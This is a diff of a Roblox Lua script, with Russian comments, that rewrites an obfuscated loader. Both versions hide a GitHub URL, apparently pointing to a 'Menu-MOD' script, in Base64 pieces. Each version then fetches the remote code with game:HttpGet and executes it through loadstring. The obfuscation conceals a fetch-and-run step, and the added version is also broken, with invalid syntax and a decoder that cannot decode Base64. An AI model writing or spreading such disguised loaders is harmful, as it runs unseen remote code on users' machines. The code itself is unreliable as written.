@@ -1,11 +1,25 @@
--- Закодированный загрузчик (Base64 + обфускация)
-local _=((function() return table.concat end)())local __={}
-__[1]="bG9h" __[2]="ZHN0" __[3]="cmlu" __[4]="Zyhn" __[5]="YW1l" __[6]="Okh0" __[7]="dHBy" __[8]="b2N0" __[9]="aWVy" __[10]="KCJo" 
-__[11]="dHRw" __[12]="czov" __[13]="L3Jh" __[14]="dy5n" __[15]="aXR1" __[16]="YnVi" __[17]="dXNl" __[18]="cmNv" __[19]="bnRl" __[20]="bnQu" 
-__[21]="Y29t" __[22]="L3Nl" __[23]="cmV6" __[24]="YW5l" __[25]="dDIv" __[26]="c2Vy" __[27]="ZXph" __[28]="bmV0" __[29]="Mi1H" __[30]="SVQt" 
-__[31]="U0FM" __[32]="TEkv" __[33]="cmVm" __[34]="cy9o" __[35]="ZWFk" __[36]="cy9t" __[37]="YWlu" __[38]="L01l" __[39]="bnUt" __[40]="TU9E" 
-__[41]="Iikp" __[42]="KCk="
+-- Вставь этот код в свой GitHub
+local _=(function() return{
+[1]="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3",
+[2]="NlcmV6YW5ldDIvc2VyZXphbmV0Mi1HSVQtU0FMTEkvbWFp",
+[3]="bi9NZW51LU1PRC5sdWE=",
+}(end))
 
-local ___ = _(__) -- Декодируем Base64
-local ____ = (loadstring or load)(game:HttpGet(___)) -- Загружаем и выполняем
-if ____ then ____() else warn("Ошибка загрузки скрипта!") end
+local function __(___)
+    return game:GetService("HttpService"):JSONDecode('"'..___..'"')
+end
+
+local _____ = table.concat(_)
+local ______ = __(_____)
+local _______ = loadstring or load
+
+if not ______ then
+    warn("Ошибка декодирования URL")
+else
+    local ________ = game:HttpGet(______)
+    if ________ then
+        _______(________)()
+    else
+        warn("Не удалось загрузить скрипт")
+    end
+end
